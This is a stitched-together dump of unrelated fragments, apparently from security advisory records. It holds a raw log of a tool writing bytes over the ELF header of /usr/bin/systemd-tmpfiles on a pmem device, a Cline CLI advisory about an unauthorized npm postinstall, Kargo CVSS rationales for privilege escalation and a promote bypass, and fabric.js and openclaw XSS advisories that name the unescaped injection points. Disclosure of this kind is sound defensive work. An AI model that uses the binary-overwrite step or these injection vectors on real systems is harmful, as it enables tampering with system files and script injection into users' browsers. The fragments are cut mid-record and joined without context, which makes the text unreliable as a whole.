===\nPartition device:         /dev/pmem0p1 (pmem0p1)\nPartition start (sectors): 2048\nSector size (bytes):       512\nPartition start (bytes):   1048576\nFilesystem block size:     4096\nFile path:                 /usr/bin/systemd-tmpfiles\nFile offset (bytes):       0\nLogical block index:       0\nIntra-block offset:        0\nPhysical block index:      40668\n→ Absolute pmem offset:    167624704\n[*] Raw read (64 bytes at 167624704):\n09fdc000  7f 45 4c 46 02 01 01 00  00 00 00 00 00 00 00 00 |.ELF............|\n09fdc010  03 00 3e 00 01 00 00 00  20 66 00 00 00 00 00 00 |..>..... f......|\n09fdc020  40 00 00 00 00 00 00 00  48 82 01 00 00 00 00 00 |@.......H.......|\n09fdc030  00 00 00 00 40 00 38 00  0d 00 40 00 20 00 1f 00 |....@.8...@. ...|\n[+] Wrote 58 bytes at absolute offset 167624704.

The published package contains a modified package.json with an added postinstall script:\n`\"postinstall\": \"npm install -g openclaw@latest\"`\nThis causes openclaw (an unrelated, non-malicious open source package) to be globally installed when cline@2.3.0 is installed. No other files were modified -- the CLI binary (dist/cli.mjs) and all other package contents are identical to the legitimate cline@2.2.3 release.\nA corrected version (2.4.0) was published at 11:23 AM PT and 2.3.0 was deprecated at 11:30 AM PT. The compromised token has been revoked and npm publishing now uses OIDC provenance via GitHub Actions.\n\n### Impact\nUsers who installed Cline CLI cline@2.3.0 during the approximately 8-hour window between 3:26 AM PT and 11:30 AM PT on February 17 will have openclaw globally installed. The openclaw package is a legitimate open source project and is not malicious, but its installation was not authorized or intended.\n\nThe Cline VS Code extension and JetBrains plugin were not affected. This advisory applies only to the Cline CLI package published on npm.\n\n### Patches\nVersions 2.4.0 and higher are fixed\n\n### Workarounds\nIf you installed Cline CLI cline@2.3.0:\n1. Update to the latest version of the Cline CLI\n`cline update` or `npm installl -g cline@latest`\n2. Verify that you have a fixed version (2.4.0 or higher)\n`cline --version`\n3. Review your environment for any unexpected installation of OpenClaw and remove it if not intended\n`npm uninstall -g openclaw`",

          "html": "## Summary\n\nThe batch resource creation endpoints of both Kargo's legacy gRPC API and newer REST API accept multi-document YAML payloads. When either endpoint creates a `Project` resource, creation of subsequent resources from that same payload belonging in that Project's underlying Kubernetes namespace, by design, proceeds using the API server's own permissions. The creator of a new Project automatically becomes its administrator, but those permissions are granted asynchronously by the management controller. The design choice to create the affected resources using the API server's own permissions averts a race and is contextually appropriate.\n\nSpecially crafted payloads can manifest a bug present in the logic of both endpoints to inject arbitrary resources (of specific types only) into the underlying namespace of an _existing_ Project using the API server's own permissions when that behavior was _not_ intended. Critically, an attacker may exploit this as a vector for elevating their own permissions, which can then be leveraged to achieve remote code execution or secret exfiltration. Exfiltrated artifact repository credentials can be leveraged, in turn, to execute further attacks.\n\nIn some configurations of the Kargo control plane's underlying Kubernetes cluster, elevated permissions may additionally be leveraged to achieve remote code execution or secret exfiltration using `kubectl`. This can reduce the complexity of the attack, however, worst case scenarios remain entirely achievable even without this.\n\n## Base Metrics\n\nThe following sections provide the rationale for the values selected for each of CVSS v4's base metrics.\n\n### Attack Vector (AV): Network\n\nThe affected endpoints are served by the Kargo API server over HTTP/HTTPS. No local or physical access is required.\n\n### Attack Complexity (AC): Low\n\nExploitation requires only a specially crafted YAML payload sent to an affected API endpoint.\n\n### Attack Requirements (AT): None\n\nNo specific environmental conditions are required beyond those that are typical for any Kargo instance.\n\n### Privileges Required (PR): Low\n\nThe attack relies only on the ability to authenticate to the Kargo API server along with basic permissions that are typically granted to all Kargo users.\n\n### User Interaction (UI): None\n\nThe attack is fully automated via API calls. No other user needs to take any action.\n\n### Confidentiality Impact to Vulnerable System (VC): High\n\nElevated permissions enable secret exfiltration from any Kargo Project.\n\n### Integrity Impact to Vulnerable System (VI): High\n\nElevated permissions enable tampering, up to and including remote code execution, as well as secret exfiltration from any Kargo Project. Project secrets often include credentials having write permissions to GitOps repositories. Such secrets may enable pushing configurations that impact the integrity of the vulnerable system, including Kargo Projects, Kargo control plane components, and the Kargo control plane's underlying Kubernetes cluster.\n\nNote: Because it is an integral component of Kargo's control plane, the underlying Kubernetes cluster has been counted as a component of the vulnerable system instead of a subsequent system.\n\n### Availability Impact to Vulnerable System (VA): High\n\nElevated permissions enable tampering, up to and including remote code execution, as well as secret exfiltration from any Kargo Project. Project secrets often include credentials having write permissions to GitOps repositories. Such secrets may enable pushing configurations that impact the availability of the vulnerable system, including Kargo control plane components and the Kargo control plane's underlying Kubernetes cluster.\n\n### Confidentiality Impact to Subsequent Systems (SC): High\n\nSecrets exfiltrated from Project namespaces typically contain credentials for external systems. These may enable exfiltration of further confidential information from those systems.\n\n### Integrity Impact to Subsequent Systems (SI): High\n\nElevated permissions enable tampering, up to and including remote code execution, as well as secret exfiltration from any Kargo Project. Project secrets often include credentials having write permissions to GitOps repositories. Such secrets may enable pushing configurations that impact the integrity of subsequent systems.\n\n### Availability Impact to Subsequent Systems (SA): High\n\nElevated permissions enable tampering, up to and including remote code execution, as well as secret exfiltration from any Kargo Project. Project secrets often include credentials having write permissions to GitOps repositories. Such secrets may enable pushing configurations that impact the availability of subsequent systems.\n\n## Mitigating Factors\n\n- Exploitation requires authentication to the Kargo API server. Anonymous access is not sufficient.\n\n- The most severe consequences of this vulnerability depend on a privilege escalation path (via `RoleBinding` injection) that was not identified by the original reporter, suggesting it is not immediately obvious from the bug alone.\n\n- There is no evidence of exploitation in the wild.",

These are standard operational permissions commonly granted to some Kargo users and do not represent what CVSS formally considers administrative or elevated access.\n\n### User Interaction (UI): None\n\nThe attack is fully automated via API calls. No other user needs to take any action.\n\n### Confidentiality Impact to Vulnerable System (VC): None\n\nThe vulnerability does not expose any data from the Kargo control plane.\n\n### Integrity Impact to Vulnerable System (VI): Low\n\nThe attacker can coerce a `Stage` into a state it might not otherwise transition to. This constitutes bounded state corruption within a single Project. Kargo itself continues to function correctly.\n\n### Availability Impact to Vulnerable System (VA): None\n\n`Promotion` resources created by exploitation of this vulnerability consume the same controller resources as a legitimate `Promotion` would. A user with proper `promote` permissions could generate identical load. The vulnerability does not introduce any new avenue for resource exhaustion.\n\n### Confidentiality Impact to Subsequent Systems (SC): None\n\nThe vulnerability does not provide any mechanism for the attacker to read data from downstream systems.\n\n### Integrity Impact to Subsequent Systems (SI): Low\n\nCritically, the attacker does not control the _content_ of `Freight` resources without artifact repositories also having been compromised. In isolation, which is how vulnerabilities are scored, the worst consequence of a successful attack is downstream systems (e.g. Argo CD) deploying incorrect revisions of artifacts, which in some cases should have been rejected by bypassed segments of the promotion pipeline. Though the operational consequences land on subsequent systems, they are bounded by the attacker's inability to inject arbitrary content.\n\n### Availability Impact to Subsequent Systems (SA): None\n\nThe attack does not provide any mechanism to degrade the availability of downstream systems beyond what could be achieved with legitimately promoted `Freight`.\n\n## Mitigating Factors\n\n- Only the REST API endpoints introduced in v1.9.0 are affected. The legacy gRPC API and the Kargo UI (which uses the gRPC API) correctly enforce the `promote` permission check and are not vulnerable.\n\n- The window of affected versions is narrow: v1.9.0 through v1.9.2.\n\n- Exploitation requires authentication to the Kargo API server and specific operational permissions (`patch` on `freights/status` or `create` on `promotions`). Anonymous or minimally privileged users cannot exploit this vulnerability.\n\n- Impact is bounded to a single Project. The `promote` bypass does not enable cross-Project access or escalation beyond the namespace in which the attacker already holds the prerequisite permissions.\n\n- There is no evidence of exploitation in the wild.",

          "html": "fabric.js applies `escapeXml()` to text content during SVG export (`src/shapes/Text/TextSVGExportMixin.ts:186`) but fails to apply it to other user-controlled string values that are interpolated into SVG attribute markup. When attacker-controlled JSON is loaded via `loadFromJSON()` and later exported via `toSVG()`, the unescaped values break out of XML attributes and inject arbitrary SVG elements including event handlers.\n\n### Deserialization Path (no sanitization)\n\n`loadFromJSON()` (`src/canvas/StaticCanvas.ts:1229`) calls `enlivenObjects()` which calls `_fromObject()` (`src/shapes/Object/Object.ts:1902`). `_fromObject` passes all deserialized properties to the shape constructor via `new this(enlivedObjectOptions)`. The constructor ultimately calls `_setOptions()` (`src/CommonMethods.ts:9`) which iterates over every property and assigns it to the object via `this.set(prop, options[prop])`. There is no allowlist or sanitization - any property in the JSON, including `id`, is set verbatim on the fabric object.\n\n---\n\n### Finding 1: XSS via `id` Property Injection \n\nThe `id` property from deserialized JSON is interpolated directly into SVG attribute strings without escaping.\n\n**Vulnerable code (`src/shapes/Object/FabricObjectSVGExportMixin.ts`, line 89, `getSvgCommons()`):**\n```typescript\ngetSvgCommons(\n  this: FabricObjectSVGExportMixin & FabricObject & { id?: string },\n) {\n  return [\n    this.id ? `id=\"${this.id}\" ` : '',  // <-- unescaped, user-controlled\n    this.clipPath\n      ? `clip-path=\"url(#${...})\" `\n      : '',\n  ].join('');\n}\n```\n\nThis method is called in `_createBaseSVGMarkup()` (same file, line 178) which wraps every object's SVG output in a `<g>` element. Every fabric object type (Rect, Circle, Path, Text, Image, Group, etc.) inherits this mixin, so the `id` injection vector applies to all object types.\n\n**Contrast with text content, which IS escaped:**\n```typescript\n// src/shapes/Text/TextSVGExportMixin.ts:186\nreturn `<tspan ...>${escapeXml(char)}</tspan>`;\n```\n\nThe inconsistency shows that the intention was to prevent injection but was missed w attribute contexts.\n\n---\n\n### Finding 2: XSS via Image `src` / `xlink:href` Injection \n\nImage source URLs are interpolated raw into `xlink:href` in `_toSVG()`.\n\n**Vulnerable code (`src/shapes/Image.ts`, line 404, `_toSVG()`):**\n```typescript\nimageMarkup.push(\n  '\\t<image ',\n  'COMMON_PARTS',\n  `xlink:href=\"${this.getSvgSrc(true)}\" x=\"${x - this.cropX}\" y=\"${\n    y - this.cropY\n  }\" ...`  // <-- unescaped\n);\n```\n\n`getSvgSrc()` returns the image `src` property which is set from JSON during deserialization. An attacker can inject a `src` value that breaks out of the `xlink:href` attribute.\n\n---\n\n### Finding 3: XSS via Pattern `sourceToString()` \n\n**Vulnerable code (`src/Pattern/Pattern.ts`, line 181, `toSVG()`):**\n```typescript\n`<image x=\"0\" y=\"0\" ... xlink:href=\"${this.sourceToString()}\"></image>`\n// <-- unescaped, returns this.source.src for image sources\n```\n\nAdditionally, Pattern's constructor (`line 92–94`) runs `this.id = uid()` *before* `Object.assign(this, options)`, meaning a user-supplied `id` in the pattern JSON overwrites the auto-generated uid. The pattern `id` is then interpolated unescaped on line 180:\n```typescript\n`<pattern id=\"SVGID_${id}\" x=\"${patternOffsetX}\" ...>`\n```\n\n---\n\n### Finding 4: Gradient `id` Partial Injection (lower Severity)\n\n**Vulnerable code (`src/gradient/Gradient.ts`, line 212, `toSVG()`):**\n```typescript\n`id=\"SVGID_${this.id}\"`  // <-- unescaped\n```\n\nGradient's constructor (`line 125`) computes `id: id ? `${id}_${uid()}` : uid()`. If a user-supplied `id` is present in the gradient JSON, it is prepended to the auto-generated uid. The user-controlled portion is interpolated unescaped into the SVG. This is exploitable but the payload is constrained by the `_<uid>` suffix appended after it.\n\n---\n\n## Impact\n\nAny application that:\n1. Accepts user-supplied JSON (via `loadFromJSON()`, collaborative sharing, import features, CMS plugins), AND\n2. Renders the `toSVG()` output in a browser context (SVG preview, export download rendered in-page, email template, embed)\n\n...is vulnerable to stored XSS. An attacker can execute arbitrary JavaScript in the victim's browser session.\n\nReal-world attack scenarios:\n- Collaborative design tools (Canva-like apps) where users share canvas state as JSON\n- CMS or e-commerce platforms with fabric.js-based editors that store/render designs\n- Any export-to-SVG workflow where the SVG is later displayed in a browser\n\n---\n\n## Remediation\n\nUpdate to [fabric.js 7.2.0](https://github.com/fabricjs/fabric.js/releases/tag/v720) or newer version. \n\n---\n\n## Confirmed Affected Files\n\n| File | Issue | Method | Exploitable |\n|---|---|---|---|\n| `src/shapes/Object/FabricObjectSVGExportMixin.ts` | Unescaped `this.id` in attribute | `getSvgCommons()` | Yes - primary vector, all object types |\n| `src/shapes/Image.ts` | Unescaped `getSvgSrc()` in `xlink:href` | `_toSVG()` | Yes |\n| `src/Pattern/Pattern.ts` | Unescaped `sourceToString()` in `xlink:href`; unescaped `id` in attribute | `toSVG()` | Yes |\n| `src/gradient/Gradient.ts` | User-supplied `id` prefix interpolated unescaped | `toSVG()` | Yes (partial - uid suffix appended) |",

A crafted value containing `</script>` could break out of the script tag and execute attacker-controlled JavaScript in the Control UI origin.\n\n## Affected Packages / Versions\n- Package: `openclaw` (npm)\n- Affected versions: `<= 2026.2.14`\n- Fixed in: `>= 2026.2.15` (next release; fix is already merged on `main`)\n\n## Details\nThe gateway Control UI HTML response previously injected `assistantName` and `assistantAvatar` directly into an inline `<script>` block using `JSON.stringify(...)`. `JSON.stringify` does not prevent `</script>` from terminating the script element, enabling stored XSS if an operator/admin sets the assistant identity to a malicious string.\n\nOpenClaw’s Control UI is intended for local use only (see `SECURITY.md`); this advisory’s CVSS reflects a loopback-only/local-access deployment assumption.\n\n## Impact\nAn attacker with the ability to set assistant identity values (config or agent identity) could cause JavaScript execution for Control UI visitors, enabling token/session theft and privileged actions in the UI.\n\n## Fix\n- Removed inline script injection and serve bootstrap config from a JSON endpoint.\n- Added a restrictive Content Security Policy for the Control UI (`script-src 'self'`, no inline scripts).\n\n## Fix Commit(s)\n- `adc818db4a4b3b8d663e7674ef20436947514e1b`\n- `3b4096e02e7e335f99f5986ec1bd566e90b14a7e`\n\n## Release Process Note\nThis advisory pre-sets the patched version to the planned next release (`2026.2.15`). Once that version is published to npm, this advisory can be published without further edits.\n\nThanks @Adam55A-code for reporting.",
